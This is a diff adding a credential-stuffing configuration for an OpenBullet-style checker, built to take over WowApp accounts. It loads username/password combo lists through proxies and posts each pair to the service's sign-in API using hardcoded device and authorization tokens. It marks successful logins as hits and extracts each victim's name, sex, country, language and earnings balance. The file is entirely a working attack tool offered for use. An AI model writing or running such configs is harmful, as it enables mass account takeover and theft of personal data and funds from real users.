@@ -1,0 +1,105 @@
+[SETTINGS]
+{
+  "Name": "wowapp",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-23T15:26:26.5324567+00:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "wowapp",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://api.wowapp.com/v3/authentication/signin4" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"country\":\"US\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json; charset=utf-8" 
+  HEADER "X-IS-WEB: true" 
+  HEADER "X-DEVICE-TOKEN: w.prXVuEogWHBmGTQ91/qJRKMuk3z99+YVdp9uLWK4NieOBMEEZ59jPFrjNeR368TH0Akx6ZUO6a7Vkebmo4FjdVbDQsuoDPKKaAJREVkfVdsc/uRaGn7QDMAUS/6VN24hL1pfNOe6rQWurfI7Dgi7c+qNlR5I65Hn4kDfJMF8AP2tgKGuSGj8YNHXzhtvEa/gxsq6xRc70atEMnLsxtVkQm65VazkrPsyoES12WGK/PkGeh9PUYsWO1iQYrg0IdxxR4r+KWFvbQHcbagh+vbbcJDkCVsF2ADjx7L1RhfF5X/q70V+tWyZCHO52B56dZFgvOUJCpKUM30bDKv+vGqj0g==" 
+  HEADER "Authorization: WOOWAUTH:eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiZGlyIn0..6wXIz5ehjYV4xhc3.3k2qYnXnjXfyKel9kRWebV5s4wItkI-nylgrmbXnYD72sUOigi1ndA2NYCnjjDRrtmM4tpVj2hJJ13jcaP8HZWIpAQSvZJViaXkKNZ1QuJEOU-tg6QASdeJtjFyMgl-aCLbM34aM2Z1V7mxzXdUvx8_SvYrJjRYWYJx5yQ6_fiKHOjOnUtz58lvHR3q5FJKRxEi1T9onGtgAnLbE3ff1p0LpfxviHzLhw9utoGWLDcBCiIhoJ50s2DsygCW98rs3bHJqgferk-xH1R59iXjH4Y94dTwTVmQDr_jzZ8NSpHJn4OasM-ToyzZpdFjZtO8BWi6cw1Pn9uGz5M7Tqlr1P53j4GIOgv0y3TGgpxKYEXfir4epdrqZh_pIVQA9038ZwC-HA7xZJx40X9mRH4bZNkz7jBbsyL7uEdhYXSy99IreOV8S3d8AIQ0f5YdOagWOdUXE.gxuzhHlFHUmmjniy2moNCg" 
+  HEADER "Content-Length: 76" 
+  HEADER "Origin: https://www.wowapp.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.wowapp.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "status\":401,\"error\":\"Unauthorized\",\"message\":\"Access Denied" 
+  KEYCHAIN Success OR 
+    KEY "{\"account\":{\"token\":" 
+
+#First_Name PARSE "<SOURCE>" LR "firstName\":\"" "\"" CreateEmpty=FALSE -> CAP "First_Name" 
+
+#Last_Name PARSE "<SOURCE>" LR "\"lastName\":\"" "\"" CreateEmpty=FALSE -> CAP "Last_Name" 
+
+#Sex PARSE "<SOURCE>" LR "sex\":\"" "\"" CreateEmpty=FALSE -> CAP "Sex" 
+
+#username PARSE "<SOURCE>" LR "username\":\"" "\"" CreateEmpty=FALSE -> CAP "Username" 
+
+#Language PARSE "<SOURCE>" LR "language\":\"" "\"" CreateEmpty=FALSE -> CAP "Language" 
+
+#Country PARSE "<SOURCE>" LR "\"country\":\"" "\"" CreateEmpty=FALSE -> CAP "Country" 
+
+#Balance PARSE "<SOURCE>" LR "currentEarningsBalance\":\"" "\"" CreateEmpty=FALSE -> CAP "Balance" 
+
+FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By" 
+
